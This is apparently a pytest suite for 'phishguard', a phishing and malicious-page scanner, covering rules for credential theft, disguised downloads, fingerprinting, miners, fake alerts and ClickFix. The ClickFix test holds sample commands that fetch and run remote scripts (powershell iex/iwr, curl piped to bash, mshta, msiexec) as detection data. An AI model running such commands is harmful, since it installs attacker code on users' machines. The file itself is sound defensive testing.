"""Phase 3: page rules, threat lists and the full verdict.

Part A tests every page rule with small hand-written captures (fast, no browser).
Part B runs every fake attack page through the real sandbox and checks the final
stamp, and writes the verdict matrix to proof/phase-3/verdicts.md.
"""
import time
from pathlib import Path

import pytest

from phishguard import intel as intel_mod
from phishguard.intel import Intel
from phishguard.pagerules import analyse, page_findings
from phishguard.sandbox import Sandbox
from phishguard.worker import ScanWorker
from tests.sites.server import FakeResolver, FakeSites

ROOT = Path(__file__).resolve().parent.parent
PROOF = ROOT / "proof" / "phase-3"
INTEL = Intel(tracker={"google-analytics.com", "doubleclick.net"} | {f"t{i}.example" for i in range(12)},
              miner={"coinhive.com"}, malware_url={"bad.example", "https://x.example/payload.exe"},
              bad_hash={"ab" * 32})


def cap(**kw):
    base = {"url": "https://shop.example.com/", "final_url": "https://shop.example.com/",
            "redirects": [], "forms": [], "events": [], "downloads": [], "request_domains": [],
            "protocol_attempts": [], "link_schemes": [], "title": "", "visible_text": "",
            "inline_script": "", "tls": {}}
    base.update(kw)
    return base


def codes(c, **kw):
    return {f.code for f in page_findings(c, INTEL, **kw)}


# --- Part A: each page rule ------------------------------------------------------------

def test_clean_page_has_no_findings():
    assert codes(cap(title="Shop", visible_text="Buy shoes")) == set()


def test_password_on_http():
    c = cap(url="http://a.example/", final_url="http://a.example/",
            forms=[{"action": "http://a.example/login", "password": True}])
    assert "PW_NO_HTTPS" in codes(c)


def test_password_sent_offsite():
    c = cap(forms=[{"action": "https://collect.evil.example/steal", "password": True}])
    assert "PW_OFFSITE" in codes(c)
    c2 = cap(forms=[{"action": "https://shop.example.com/login", "password": True}])
    assert "PW_OFFSITE" not in codes(c2)


def test_brand_login_only_with_password_field_and_wrong_domain():
    fs = page_findings(cap(title="PayPal: Log in", forms=[{"action": "", "password": True}]), INTEL)
    assert any(f.code == "BRAND_LOGIN" and "PayPal login" in f.message for f in fs)
    assert "BRAND_LOGIN" not in codes(cap(title="PayPal: Log in"))                      # no password field
    real = cap(url="https://www.paypal.com/", final_url="https://www.paypal.com/signin",
               title="PayPal: Log in", forms=[{"action": "https://www.paypal.com/x", "password": True}])
    assert "BRAND_LOGIN" not in codes(real)


def test_redirect_away_and_many_hops():
    c = cap(url="https://a.example/", final_url="https://b.example/",
            redirects=[{"url": "https://a.example/"}, {"url": "https://b.example/"}])
    assert "REDIRECTED_AWAY" in codes(c)
    same = cap(redirects=[{"url": "https://shop.example.com/"}, {"url": "https://shop.example.com/x"}])
    assert "REDIRECTED_AWAY" not in codes(same)


def test_new_certificate():
    now = time.time()
    assert "CERT_NEW" in codes(cap(tls={"validFrom": now - 2 * 86400}), now=now)
    assert "CERT_NEW" not in codes(cap(tls={"validFrom": now - 90 * 86400}), now=now)


def test_malware_lists_check_every_hop():
    c = cap(url="https://ok.example/", final_url="https://ok2.example/",
            redirects=[{"url": "https://ok.example/"}, {"url": "https://bad.example/x"}, {"url": "https://ok2.example/"}])
    assert "MALWARE_URL" in codes(c)


def test_known_bad_hash():
    c = cap(downloads=[{"filename": "a.pdf", "real_type": "pdf", "executable": False, "sha256": "AB" * 32}])
    assert "DL_KNOWN_BAD" in codes(c)


@pytest.mark.parametrize("dl,expected,absent", [
    ({"filename": "setup.exe", "real_type": "windows-program", "executable": True}, {"DL_EXECUTABLE", "DL_NO_CLICK"}, {"DL_DISGUISED"}),
    ({"filename": "invoice.pdf.exe", "real_type": "windows-program", "executable": True}, {"DL_EXECUTABLE", "DL_DISGUISED"}, set()),
    ({"filename": "report.pdf", "real_type": "windows-program", "executable": True}, {"DL_EXECUTABLE", "DL_DISGUISED"}, set()),
    ({"filename": "photos.zip", "real_type": "zip", "executable": True, "inner_executables": ["photo.scr"]}, {"DL_ARCHIVE_EXE"}, set()),
    ({"filename": "doc.iso", "real_type": "disk-image", "executable": True}, {"DL_ARCHIVE_EXE"}, set()),
    ({"filename": "notes.pdf", "real_type": "pdf", "executable": False}, {"DL_NO_CLICK"}, {"DL_EXECUTABLE", "DL_DISGUISED"}),
])
def test_download_rules(dl, expected, absent):
    got = codes(cap(downloads=[dl]))
    assert expected <= got and not (absent & got), got


def test_fingerprint_weight_grows_and_caps():
    few = page_findings(cap(events=[{"t": "fp", "k": "canvas"}]), INTEL)
    many = page_findings(cap(events=[{"t": "fp", "k": k} for k in "abcdefgh"]), INTEL)
    w = lambda fs: next(f.weight for f in fs if f.code == "FINGERPRINT")  # noqa: E731
    assert w(few) == 6 and w(many) == 30


def test_webrtc_and_trackers():
    many = cap(events=[{"t": "webrtc"}], request_domains=[f"cdn.t{i}.example" for i in range(12)])
    assert {"WEBRTC", "TRACKERS_MANY"} <= codes(many)
    few = cap(request_domains=["www.google-analytics.com"])
    assert "TRACKERS_MANY" not in codes(few)


def test_ip_logger_hop():
    c = cap(redirects=[{"url": "https://short.example/a"}, {"url": "https://grabify.link/x"}, {"url": "https://shop.example.com/"}])
    assert "IP_LOGGER_HOP" in codes(c)


@pytest.mark.parametrize("text,hit", [
    ('powershell -w hidden -c "iex (iwr http://x/p.ps1)"', True),
    ("cmd /c start msiexec /i http://x/a.msi", True),
    ("mshta https://x.example/a.hta", True),
    ("curl -s https://x.example/i.sh | bash", True),
    ("Your coupon code is SAVE20", False),
    ("https://example.com/share/123", False),
])
def test_clickfix_detection(text, hit):
    got = codes(cap(events=[{"t": "clipboard", "text": text}]))
    assert ("CLICKFIX" in got) is hit


def test_protocol_launch_and_links():
    assert "PROTOCOL_LAUNCH" in codes(cap(protocol_attempts=[{"scheme": "ms-msdt", "url": "ms-msdt:/id x"}]))
    assert "PROTOCOL_LINK" in codes(cap(link_schemes=["search-ms", "https"]))
    assert not {"PROTOCOL_LAUNCH", "PROTOCOL_LINK"} & codes(cap(link_schemes=["mailto", "tel", "https"]))


def test_miner_by_domain_or_wasm_pattern():
    assert "MINER" in codes(cap(request_domains=["www.coinhive.com"]))
    assert "MINER" in codes(cap(events=[{"t": "wasm"}], inline_script="var cfg={algo:'cryptonight', throttle:0.3}"))
    assert "MINER" not in codes(cap(events=[{"t": "wasm"}], inline_script="startGame()"))   # games use wasm too


def test_fake_alert_needs_words_and_trap():
    words = "WARNING! Your computer is infected. Call Microsoft Support now."
    assert "FAKE_ALERT" in codes(cap(visible_text=words, events=[{"t": "fullscreen"}]))
    assert "FAKE_ALERT" not in codes(cap(visible_text=words))                      # an article about scams
    assert "FAKE_ALERT" not in codes(cap(visible_text="Watch in full screen", events=[{"t": "fullscreen"}]))


def test_abuse_signals():
    got = codes(cap(events=[{"t": "keylock"}, {"t": "perm", "k": "notifications"}, {"t": "eval", "n": 3}]))
    assert {"KEYBOARD_LOCK", "PERMISSION_GRAB", "OBFUSCATED"} <= got
    assert "OBFUSCATED" in codes(cap(inline_script="var p='" + "A" * 2000 + "';"))


def test_open_redirect_from_trusted_site():
    c = cap(url="https://trusted.example/out?u=x", final_url="https://evil.example/",
            redirects=[{"url": "https://trusted.example/out?u=x"}, {"url": "https://evil.example/"}])
    assert "OPEN_REDIRECT" in codes(c, allowlist={"trusted.example"})
    assert "OPEN_REDIRECT" not in codes(c)       # not trusted, so nothing was abused


def test_blocklist_applies_to_hops():
    c = cap(redirects=[{"url": "https://a.example/"}, {"url": "https://blocked.example/"}])
    assert "BLOCKLISTED" in codes(c, blocklist={"blocked.example"})


def test_analyse_merges_and_counts_each_rule_once():
    c = cap(url="https://grabify.link/x", final_url="https://grabify.link/x",
            redirects=[{"url": "https://grabify.link/x"}])
    v = analyse(c, INTEL)
    ip = [f for f in v["findings"] if f.code in ("IP_LOGGER", "IP_LOGGER_HOP")]
    assert len(ip) == 1 and v["subs"]["tracking"] == 60 and v["level"] == "danger"
    assert v["privacy"]["ip_logger"] is True


def test_privacy_report():
    c = cap(url="https://shop.example.com/?utm_source=mail&id=3",
            events=[{"t": "fp", "k": "canvas"}, {"t": "webrtc"}],
            request_domains=["www.google-analytics.com", "stats.g.doubleclick.net", "shop.example.com"])
    p = analyse(c, INTEL)["privacy"]
    assert p["trackers"] == ["doubleclick.net", "google-analytics.com"]
    assert p["fingerprinting"] == ["canvas"] and p["webrtc"] is True
    assert p["params_removed"] == ["utm_source"]


def test_bundled_lists_load():
    real = Intel.load()
    assert real.count("tracker") > 80 and real.count("miner") > 10
    assert real.host_in("tracker", "www.google-analytics.com") == "google-analytics.com"
    assert real.count("ip_logger") == len(intel_mod.IP_LOGGERS)


# --- Part B: every fake attack page, end to end -------------------------------------------

# The local test server is plain http on a random port. Those two URL rules are tested
# in Phase 1; here they would add the same noise to every page, so they are left out.
IGNORE = {"NO_HTTPS", "UNUSUAL_PORT"}

MATRIX = [
    # name, host, path, expected level, category that must lead
    ("Normal page", "plain.test", "/plain", "clear", None),
    ("Fake bank login", "bank.test", "/bank", "danger", "phishing"),
    ("invoice.pdf.exe download", "files.test", "/invoice", "danger", "malware"),
    # Tracking alone is a privacy note, not a danger (big sites like x.com all fingerprint).
    ("Fingerprinting page", "plain.test", "/fingerprint", "clear", None),
    ("IP-logger link", "short.test", "/go", "danger", "tracking"),
    ("ClickFix fake CAPTCHA", "evil.test", "/clickfix", "danger", "abuse"),
    ("ms-msdt launcher", "evil.test", "/msdt", "danger", "abuse"),
    ("Fake virus alert", "evil.test", "/scam", "danger", "abuse"),
    ("Crypto-miner", "evil.test", "/miner", "danger", "abuse"),
    ("Open redirect from a trusted site", "trusted.test", "/out?url={evil}", "caution", "abuse"),
]


@pytest.fixture(scope="module")
def worker(tmp_path_factory):
    sites = FakeSites().start()
    base = tmp_path_factory.mktemp("p3")
    w = ScanWorker(lambda: Sandbox(base / "shots", base / "q", resolver_factory=FakeResolver,
                                   exempt={("127.0.0.1", sites.port)}, extra_args=sites.chrome_args())).start()
    assert w.ready.wait(30)
    rows = []
    yield w, sites, rows
    w.stop()
    sites.stop()
    PROOF.mkdir(parents=True, exist_ok=True)
    lines = ["# Verdict matrix: every fake attack page through the real sandbox", "",
             "| Fake page | Phishing | Malware | Tracking | Tricks | Stamp | Main reasons |",
             "|---|---:|---:|---:|---:|---|---|"]
    for name, v in rows:
        s = v["subs"]
        top = sorted(v["findings"], key=lambda f: -f.weight)[:3]
        reasons = "<br>".join(f.message for f in top) or "-"
        lines.append(f"| {name} | {s['phishing']} | {s['malware']} | {s['tracking']} | {s['abuse']} "
                     f"| **{v['level'].upper()}** | {reasons} |")
    (PROOF / "verdicts.md").write_text("\n".join(lines) + "\n", encoding="utf-8")


@pytest.mark.parametrize("name,host,path,level,lead", MATRIX, ids=[m[0] for m in MATRIX])
def test_end_to_end_verdict(worker, name, host, path, level, lead):
    w, sites, rows = worker
    path = path.replace("{evil}", sites.url("evil.test", "/evil"))
    c = w.submit(sites.url(host, path), f"e2e-{len(rows)}").result(timeout=60)
    v = analyse(c.to_dict(), INTEL, allowlist={"trusted.test"}, ignore=IGNORE)
    rows.append((name, v))
    assert v["level"] == level, (v["subs"], [(f.code, f.weight) for f in v["findings"]])
    if lead:
        assert v["subs"][lead] == v["score"], v["subs"]
    if name == "Fingerprinting page":          # still reported in full, just not counted as danger
        assert v["subs"]["tracking"] > 0 and "FINGERPRINT" not in v["counted"]
    # Regression: Playwright's own eval calls once made busy pages look "obfuscated".
    if name in ("Fingerprinting page", "Fake virus alert", "Normal page"):
        assert "OBFUSCATED" not in {f.code for f in v["findings"]}
